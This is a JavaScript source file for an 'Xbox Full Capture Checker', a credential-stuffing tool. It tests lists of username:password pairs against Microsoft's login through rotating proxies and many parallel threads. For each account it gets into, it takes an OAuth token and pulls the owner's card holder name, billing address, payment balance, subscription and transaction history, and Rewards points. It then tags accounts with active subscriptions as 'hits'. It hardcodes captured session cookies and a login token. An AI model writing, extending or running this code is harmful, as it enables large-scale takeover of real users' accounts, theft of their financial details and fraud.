// ============================================================
//  Xbox Full Capture Checker — 1:1 port of backup-3.py
//  Uses hardcoded ppsecure POST (same as Python requests.Session)
//  with CookieJar to track cookies across all redirects.
// ============================================================

const { proxiedFetch } = require("./proxy-manager");
const { runPool } = require("./worker-pool");

// ── Cookie jar (session-like, matches Python requests.Session) ──
class CookieJar {
  constructor(initial = "") {
    this.jar = {};
    if (initial) {
      for (const part of initial.split(";")) {
        const eq = part.indexOf("=");
        if (eq > 0) {
          const name = part.slice(0, eq).trim();
          const val = part.slice(eq + 1).trim();
          if (name) this.jar[name] = val;
        }
      }
    }
  }
  ingest(headers) {
    const setCookies = headers.getSetCookie?.() || [];
    for (const c of setCookies) {
      const [pair] = c.split(";");
      const eq = pair.indexOf("=");
      if (eq > 0) {
        const name = pair.slice(0, eq).trim();
        const val = pair.slice(eq + 1).trim();
        if (name) this.jar[name] = val;
      }
    }
  }
  header() {
    return Object.entries(this.jar).map(([k, v]) => `${k}=${v}`).join("; ");
  }
  dict() { return { ...this.jar }; }
}

// ── Helpers ──
function parseLR(text, left, right) {
  const re = new RegExp(
    left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") +
      "(.*?)" +
      right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
    "s"
  );
  const m = text.match(re);
  return m ? m[1] : "";
}

function checkStatus(text, url, cookies) {
  if (
    text.includes("Your account or password is incorrect.") ||
    text.includes("That Microsoft account doesn\\'t exist.") ||
    text.includes("Sign in to your Microsoft account") ||
    text.includes("timed out")
  )
    return "FAILURE";
  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
  if (
    text.includes("account.live.com/recover?mkt") ||
    text.includes("recover?mkt") ||
    text.includes("account.live.com/identity/confirm?mkt") ||
    text.includes("Email/Confirm?mkt")
  )
    return "2FACTOR";
  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
  if (("ANON" in cookies || "WLSSC" in cookies) && url.includes("https://login.live.com/oauth20_desktop.srf?"))
    return "SUCCESS";
  return "UNKNOWN_FAILURE";
}

// ── Session fetch: manual redirect following to accumulate cookies (like Python requests.Session) ──
async function sessionFetch(url, opts, jar, signal) {
  let currentUrl = url;
  let method = opts.method || "GET";
  let body = opts.body;
  let res;
  let text = "";

  for (let hop = 0; hop < 15; hop++) {
    const headers = { ...(opts.headers || {}) };
    const cookieStr = jar.header();
    if (cookieStr) headers.Cookie = cookieStr;

    res = await proxiedFetch(currentUrl, {
      method,
      body,
      headers,
      redirect: "manual",
      signal,
    });
    jar.ingest(res.headers);

    const status = res.status;
    if (status >= 300 && status < 400) {
      const loc = res.headers.get("location");
      if (!loc) break;
      currentUrl = new URL(loc, currentUrl).toString();
      // Redirects become GET (except 307/308)
      if (status !== 307 && status !== 308) {
        method = "GET";
        body = undefined;
      }
      // Consume body to avoid memory leaks
      try { await res.text(); } catch {}
      continue;
    }
    text = await res.text();
    break;
  }

  return { text, finalUrl: currentUrl, res };
}

// ── Hardcoded initial cookies from Python script (exact match) ──
const STATIC_COOKIES = `CAW=<EncryptedData xmlns="http://www.w3.org/2001/04/xmlenc#" Id="BinaryDAToken1" Type="http://www.w3.org/2001/04/xmlenc#Element"><EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#tripledes-cbc"></EncryptionMethod><ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:KeyName>http://Passport.NET/STS</ds:KeyName></ds:KeyInfo><CipherData><CipherValue>M.C534_BAY.0.U.CqFsIZLJMLjYZcShFFeq37gPy/ReDTOxI578jdvIQe34OFFxXwod0nSinliq0/kVdaZSdVum5FllwJWBbzH7LQqQlNIH4ZRpA4BmNDKVZK9APSoJ+YNEFX7J4eX4arCa69y0j3ebxxB0ET0+8JKNwx38dp9htv/fQetuxQab47sTb8lzySoYn0RZj/5NRQHRFS3PSZb8tSfIAQ5hzk36NsjBZbC7PEKCOcUkePrY9skUGiWstNDjqssVmfVxwGIk6kxfyAOiV3on+9vOMIfZZIako5uD3VceGABh7ZxD+cwC0ksKgsXzQs9cJFZ+G1LGod0mzDWJHurWBa4c0DN3LBjijQnAvQmNezBMatjQFEkB4c8AVsAUgBNQKWpXP9p3pSbhgAVm27xBf7rIe2pYlncDgB7YCxkAndJntROeurd011eKT6/wRiVLdym6TUSlUOnMBAT5BvhK/AY4dZ026czQS2p4NXXX6y2NiOWVdtDyV51U6Yabq3FuJRP9PwL0QA==</CipherValue></CipherData></EncryptedData>`;

const STATIC_PPFT = "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$";

// ── Common headers (exact match to Python) ──
const COMMON_HEADERS = {
  "Host": "login.live.com",
  "Connection": "keep-alive",
  "Cache-Control": "max-age=0",
  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "sec-ch-ua-platform-version": '"12.0.0"',
  "Upgrade-Insecure-Requests": "1",
  "Origin": "https://login.live.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "X-Edge-Shopping-Flag": "1",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

const OAUTH_TOKEN_URL =
  "https://login.live.com/oauth20_authorize.srf" +
  "?client_id=000000000004773A" +
  "&response_type=token" +
  "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete" +
  "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth" +
  "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D" +
  "&prompt=none";

async function checkSingleAccount(credential, signal) {
  const sep = credential.indexOf(":");
  if (sep < 0) return { status: "fail", user: credential, password: "", detail: "Bad format" };

  const user = credential.slice(0, sep);
  const password = credential.slice(sep + 1);

  // Fresh cookie jar with static initial cookies (exact same as Python)
  const jar = new CookieJar(STATIC_COOKIES);

  try {
    // ── Step 1: POST directly to ppsecure/post.srf (exact same as Python) ──
    const loginUrl =
      "https://login.live.com/ppsecure/post.srf" +
      "?client_id=0000000048170EF2" +
      "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
      "&response_type=token" +
      "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
      "&display=touch" +
      `&username=${encodeURIComponent(user)}` +
      "&contextid=2CCDB02DC526CA71" +
      "&bk=" + Math.floor(Date.now() / 1000) +
      "&uaid=a5b22c26bc704002ac309462e8d061bb" +
      "&pid=15216";

    const postBody =
      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
      `&PPFT=${encodeURIComponent(STATIC_PPFT)}` +
      `&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1` +
      `&isSignupPost=0&isRecoveryAttemptPost=0&i13=1` +
      `&login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1` +
      `&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;

    const { text: text1, finalUrl } = await sessionFetch(loginUrl, {
      method: "POST",
      headers: COMMON_HEADERS,
      body: postBody,
    }, jar, signal);

    // ── Step 2: KEYCHECK (exact same as Python) ──
    const status = checkStatus(text1, finalUrl, jar.dict());

    if (status !== "SUCCESS") {
      if (status === "FAILURE") return { status: "fail", user, password, detail: "Invalid Credentials" };
      if (status === "UNKNOWN_FAILURE") return { status: "retry", user, password, detail: "Unknown Failure" };
      if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
      if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
      if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Custom Lock" };
      return { status: "fail", user, password, detail: status };
    }

    // ── Step 3: OAuth token (exact same as Python) ──
    const { text: _t2, finalUrl: url2 } = await sessionFetch(OAUTH_TOKEN_URL, {
      headers: {
        "Host": "login.live.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": "https://account.microsoft.com/",
      },
    }, jar, signal);

    const token = decodeURIComponent(parseLR(url2, "access_token=", "&token_type") || "");
    if (!token) return { status: "locked", user, password, detail: "Token Parse Fail" };

    // ── Step 4: Payment info (exact same headers as Python) ──
    const apiHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
      "Pragma": "no-cache",
      "Accept": "application/json",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "en-US,en;q=0.9",
      "Authorization": `MSADELEGATE1.0="${token}"`,
      "Connection": "keep-alive",
      "Content-Type": "application/json",
      "Host": "paymentinstruments.mp.microsoft.com",
      "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2",
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
      "Sec-GPC": "1",
    };

    const r3 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
      { headers: { ...apiHeaders, Cookie: jar.header() }, signal }
    );
    const src3 = await r3.text();

    const balance = parseLR(src3, 'balance":', ',"') || "N/A";
    const cardHolder = parseLR(src3, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
    const accountHolderName = parseLR(src3, 'accountHolderName":"', '","') || "N/A";
    const zipcode = parseLR(src3, '"postal_code":"', '",') || "N/A";
    const region = parseLR(src3, '"region":"', '",') || "N/A";
    const address1 = parseLR(src3, '{"address_line1":"', '",') || "N/A";
    const city = parseLR(src3, '"city":"', '",') || "N/A";

    // ── Step 5: Subscription/transactions (exact same as Python) ──
    const r5 = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
      { headers: { ...apiHeaders, Cookie: jar.header() }, signal }
    );
    const src5 = await r5.text();

    const country = parseLR(src5, 'country":"', '"}') || "N/A";
    const subscription = parseLR(src5, 'title":"', '",') || "N/A";
    const item1 = parseLR(src5, '"title":"', '"') || "N/A";
    const ctpid = parseLR(src5, '"subscriptionId":"ctp:', '"') || "N/A";
    const autoRenew = ctpid !== "N/A"
      ? (parseLR(src5, `{"subscriptionId":"ctp:${ctpid}","autoRenew":`, ",") || "N/A")
      : "N/A";
    const startDate = parseLR(src5, '"startDate":"', "T") || "N/A";
    const nextRenewal = parseLR(src5, '"nextRenewalDate":"', "T") || "N/A";
    const description = parseLR(src5, '"description":"', '"') || "N/A";
    const quantity = parseLR(src5, '"quantity":', ",") || "N/A";
    const currency = parseLR(src5, '"currency":"', '"') || "";
    const totalAmount = parseLR(src5, '"totalAmount":', ",") || "N/A";

    // ── Step 6: Rewards/Bing points (exact same as Python) ──
    let points = "0";
    try {
      const r4 = await proxiedFetch("https://rewards.bing.com/", {
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
          "Pragma": "no-cache",
          "Accept": "*/*",
          Cookie: jar.header(),
        },
        signal,
      });
      const src4 = await r4.text();
      points = parseLR(src4, ',"availablePoints":', ',"') || "0";
    } catch {}

    // ── Captures (exact same format as Python) ──
    const captures = {
      Address: `[ Address: ${address1}, City: ${city}, State: ${region}, Postalcode: ${zipcode} ]`,
      Points: points,
      "CC-Cap": `[Country: ${country} | CardHolder: ${accountHolderName} | CC: ${cardHolder} | CC Funding: $${balance} ]`,
      "Subscription-1": `[ Purchased Item: ${item1} | Auto Renew: ${autoRenew} | startDate: ${startDate} | Next Billing: ${nextRenewal} ]`,
      "Subscription-2": `[ Product: ${description} | Total Purchase: ${quantity} | Avaliable Points: ${points} | Total Price: ${totalAmount}${currency} ]`,
    };

    // ── Hit/Free classification (exact same as Python) ──
    let isActive = false;
    if (subscription && subscription !== "N/A") {
      if (nextRenewal && nextRenewal !== "N/A") {
        try {
          const renewalDate = new Date(nextRenewal);
          const today = new Date();
          today.setHours(0, 0, 0, 0);
          if (!isNaN(renewalDate.getTime()) && renewalDate >= today) {
            isActive = true;
          }
        } catch {}
      }
    }

    return {
      status: isActive ? "hit" : "free",
      user,
      password,
      captures,
      detail: isActive ? "Active Subscription" : "No/Expired Sub",
    };
  } catch (err) {
    if (err.name === "AbortError") return { status: "fail", user, password, detail: "Aborted" };
    const msg = err.message || String(err);
    if (msg.includes("fetch") || msg.includes("ECONNR") || msg.includes("timeout") || msg.includes("socket"))
      return { status: "retry", user, password, detail: "Connection Error" };
    return { status: "fail", user, password, detail: msg.slice(0, 60) };
  }
}

async function checkXboxAccounts(accounts, threads = 30, onProgress, signal) {
  const results = await runPool({
    items: accounts,
    concurrency: threads,
    maxRetries: 2,
    signal,
    scope: "xboxchk",
    runner: async (cred, ctx) => {
      const r = await checkSingleAccount(cred, ctx.signal);
      if (r.status === "retry") return { retry: true };
      return { result: r };
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r);
    },
  });
  return results.filter(Boolean);
}

module.exports = { checkXboxAccounts, checkSingleAccount };
